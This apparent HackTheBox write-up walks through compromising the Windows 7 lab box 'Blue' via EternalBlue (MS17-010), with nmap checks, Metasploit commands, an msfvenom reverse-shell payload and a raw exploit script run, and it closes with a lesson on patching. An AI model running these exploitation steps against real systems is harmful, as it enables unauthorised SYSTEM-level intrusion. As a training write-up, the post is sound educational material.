---
layout: post
title: "The Door That Was Never Locked"
subtitle: "HTB Blue, a Windows 7 host that hands you SYSTEM in one shot because its file-sharing service never grew past 2017."
date: 2018-01-20 12:00:00 +0000
description: "One unpatched SMB service, one kernel-level RCE, and Blue hands you the whole machine before you have time to enumerate anything."
image: /assets/og/the-door-that-was-never-locked.png
tags: [hackthebox, writeup]
---

Blue is the box people point to when they want to explain why your aunt's old laptop is a liability. There is no clever chain here, no foothold that earns a second foothold, no user you climb off of to reach root. There is one service that should have been patched the spring it came out, and when you push on it the machine does not give you a user account. It gives you the kernel. You knock on the file-sharing port, the file-sharing port gets confused about how big your packet is, and the confusion is severe enough that you end up running code as the most powerful account on the system. Both flags fall in the same minute, because there was never a wall between them. The whole box is a single unlocked door wearing a fresh coat of paint.

```
        B L U E
        =======
        445/tcp   SMBv1   "windows 7, never patched"
            |
            ?  )))  a packet that lies about its own length
            !  (((  the kernel believes the lie, writes past the edge
            |
            v
        code runs in ring 0, as NT AUTHORITY\SYSTEM
        user.txt and root.txt fall in the same breath.
                                                        鍵
```

## 0x01 · the knock

Three ports, all Windows, all bored. RPC on 135, NetBIOS on 139, SMB on 445, and a scatter of high RPC ports up in the 49000s that Windows hands out like business cards.

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
```

That banner is the entire box, printed in plain text. Windows 7 Professional, build 7601, Service Pack 1. SP1 was the last service pack Windows 7 ever got, and a host still wearing it in a lab is a host that stopped taking updates years ago. Old SMB is not always the way in. Here it is the whole way in, the only way in, and the box is daring you to notice.

## 0x02 · the lie about length

Before the exploit there is a thirty-second confirmation. nmap ships a script that asks the question directly.

```
# nmap -p445 --script smb-vuln-ms17-010 10.10.10.40
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
```

CVE-2017-0143 is one of the cluster the world learned to call EternalBlue. To see why it matters, you have to understand what SMBv1 is supposed to do. SMB is the protocol that lets one Windows machine reach into another's shared folders as if they were local. It is the plumbing behind every mapped network drive your office ever gave you. The first version of that protocol is ancient, and it has a bookkeeping flaw in how it copies certain requests into memory.

Think of it like a coat-check clerk who writes down how many coats you handed over, except he writes the number on a separate slip from the coats themselves. EternalBlue hands the clerk one count on the slip and a different pile of coats in his arms. He trusts the slip. He keeps reaching for coats that were never there, walks right off the end of his own counter, and starts grabbing things off the shelf behind it. In SMBv1 that shelf is kernel memory. The packet claims one size, carries another, and the mismatch lets an attacker write data past the buffer the kernel set aside, straight into territory the kernel uses to run itself.

The precise version: a type-confusion between two SMB structures causes the server to allocate a buffer based on one field and copy based on another. The copy runs long, corrupts adjacent kernel pool memory, and a carefully shaped grooming of that pool turns the overflow into a controlled write, and the controlled write into code execution. No credentials. No user interaction. The service answers the door itself.

## 0x03 · the easy hand

The polished path is a single Metasploit module that does the pool grooming for you so you never have to see the math.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.10.10.40
msf6 > set LHOST 10.10.14.4
msf6 > run

[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened
```

The thing to sit with is what account you land as. This is not a low-privilege foothold you have to escalate from. SMB runs inside the kernel, and code injected through a kernel bug runs at kernel privilege, which surfaces in userland as the SYSTEM account.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

NT AUTHORITY\SYSTEM is the floor under the administrator. It is the account Windows itself uses to be Windows. There is no higher rung. Picture sneaking into an office building and discovering that the door you jimmied opened directly into the room where they print the master keys. You did not climb to the top. You started there.

## 0x04 · the hand you play without metasploit

The honest version, the one that teaches you what the module hides, drops the framework and drives the raw exploit. The AutoBlue family of scripts (a helper named send_and_execute does the lifting) takes the EternalBlue primitive and uses it to upload and run a binary of your choosing. It wants Python 2 and Impacket, so you cage it in a virtual environment to keep that fossil away from your real system.

First you build the payload to run. This is where care matters, so the snippet below is defanged on purpose. The reverse-shell stub is replaced with a clearly labelled placeholder rather than a live one-liner.

```
# the shape, not a working backdoor
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=10.10.14.4 LPORT=443 \
         -f exe -o iceberg.exe
#         ^ payload connects back to your listener; see [NC CALLBACK PLACEHOLDER]
#           [NC CALLBACK PLACEHOLDER] = a netcat listener on 10.10.14.4:443
#           waiting to catch the SYSTEM shell the exe throws home
```

Then you point the exploit at the box and feed it the file. The script grooms the kernel pool, lands the overflow, and executes your binary in the SYSTEM context that the bug already grants.

```
# python2 send_and_execute.py 10.10.10.40 iceberg.exe
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[*] Got frag size: 0x10
[*] sending and executing iceberg.exe ...
[+] done
```

Your listener catches a shell, and it is the same SYSTEM you would have gotten the lazy way. The two paths converge because there was only ever one bug. One path narrates it; the other hides it behind a progress bar.

## 0x05 · collecting what was never guarded

There is no privilege escalation section because there is no privilege left to escalate. As SYSTEM you can read every file on disk, so both flags are just a matter of walking to where they sit.

```
C:\> type C:\Users\haris\Desktop\user.txt
████████████████████████████████

C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

One belongs to a normal user named haris and one belongs to the administrator, and from where you are standing the distinction is decorative. You did not earn user and then earn root. You skipped the entire ladder and landed above the top rung, and the two trophies were sitting in rooms that no longer had locks because you were holding the master key the moment you walked in.

## 0x06 · the honest caveat

It is tempting to file Blue under trivia, the easy box everyone does on day one, the one where root first blood was measured in single-digit minutes. That framing misses the part worth keeping. EternalBlue was not a researcher's neat little proof of concept that leaked early. It was a weapon, built and hoarded by an intelligence agency, stolen, dumped in public, and then bolted into WannaCry and NotPetya, which together froze hospitals, shut down ports, and erased an estimated ten billion dollars of value across the planet in 2017. Microsoft shipped the patch in March of that year, weeks before the worms hit. The carnage happened anyway, on machines that had every chance to update and simply did not.

That is the lesson this box quietly carries under its blue paint. The vulnerability was never the interesting part. A type-confusion in a legacy protocol is a date on a patch calendar, the kind of thing one update closes forever. The interesting part is the gap between the fix existing and the fix being applied, because that gap is where every real incident lives. Blue is not a story about a clever attacker. It is a story about a patch that was available and a host that never took it, repeated across a planet's worth of unattended machines. You cannot exploit this box if the host ran Windows Update once in the spring of 2017. The exploit is loud and brilliant. The failure underneath it is just a thing nobody got around to doing.

## 0x07 · outro

```
the door said windows 7, never patched.
the kernel believed a packet about its own size.
the lie reached past the edge and into the room
        where the machine keeps its own keys.

no climb. no user, then root. just the top floor,
reached through a hole a march patch had already sealed.

patch the old plumbing. retire smbv1. doubt the legacy. wear black.

                                                            EOF
```

---

*HTB: Blue, retired 13 Jan 2018. an easy box that is really a memorial to 2017, the year an unapplied patch cost the world ten billion dollars. the bug closes on a tuesday; the habit of not patching never quite does.*